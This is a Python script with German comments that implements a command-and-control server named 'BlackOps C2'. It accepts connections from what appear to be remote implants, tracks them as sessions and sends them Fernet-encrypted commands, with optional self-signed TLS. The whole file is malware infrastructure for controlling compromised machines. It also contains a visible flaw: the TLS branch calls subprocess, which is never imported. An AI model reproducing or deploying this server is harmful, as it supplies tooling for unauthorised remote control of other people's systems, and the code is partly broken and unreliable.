#!/usr/bin/env python3
import socket
import threading
import ssl
import json
from cryptography.fernet import Fernet
import os
import sys

class C2Server:
    def __init__(self, host="0.0.0.0", port=4443, use_ssl=False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.sessions = []
        self.session_counter = 0
        self.running = True

    def start(self):
        """Startet den Server."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(5)
        print(f"[*] C2 Server lauscht auf {self.host}:{self.port}")
        print(f"[*] Verschlüsselungsschlüssel: {self.key.decode()}")

        if self.use_ssl:
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            # Zertifikate müssen vorhanden sein – für Test selbstsigniert:
            if not os.path.exists("certs/server.crt"):
                print("[!] SSL-Zertifikate nicht gefunden. Erstelle selbstsignierte...")
                os.makedirs("certs", exist_ok=True)
                subprocess.run([
                    "openssl", "req", "-x509", "-newkey", "rsa:4096",
                    "-keyout", "certs/server.key", "-out", "certs/server.crt",
                    "-days", "365", "-nodes", "-subj", "/CN=BlackOps"
                ], check=True)
            context.load_cert_chain("certs/server.crt", "certs/server.key")
            sock = context.wrap_socket(sock, server_side=True)

        while self.running:
            client, addr = sock.accept()
            self.session_counter += 1
            session_id = self.session_counter
            print(f"[+] Neue Session {session_id} von {addr[0]}:{addr[1]}")
            session = {
                "id": session_id,
                "conn": client,
                "addr": addr,
                "active": True
            }
            self.sessions.append(session)
            thread = threading.Thread(target=self.handle_session, args=(session,))
            thread.daemon = True
            thread.start()

    def handle_session(self, session):
        """Verwaltet eine einzelne Session."""
        conn = session["conn"]
        conn.send(self.cipher.encrypt(b"[+] Verbunden mit BlackOps C2\n"))
        while session["active"]:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                decrypted = self.cipher.decrypt(data).decode(errors="ignore")
                print(f"[Session {session['id']}] {decrypted}")
            except:
                break
        print(f"[-] Session {session['id']} geschlossen.")
        session["active"] = False
        conn.close()

    def send_command(self, session_id, command):
        """Sendet einen Befehl an eine Session."""
        for s in self.sessions:
            if s["id"] == session_id and s["active"]:
                enc = self.cipher.encrypt(command.encode())
                s["conn"].send(enc)
                return True
        return False

    def list_sessions(self):
        """Listet aktive Sessions."""
        active = [s for s in self.sessions if s["active"]]
        for s in active:
            print(f"Session {s['id']}: {s['addr'][0]}:{s['addr'][1]}")
        return active

    def stop(self):
        self.running = False

if __name__ == "__main__":
    server = C2Server(use_ssl=False)
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Server gestoppt.")
        server.stop()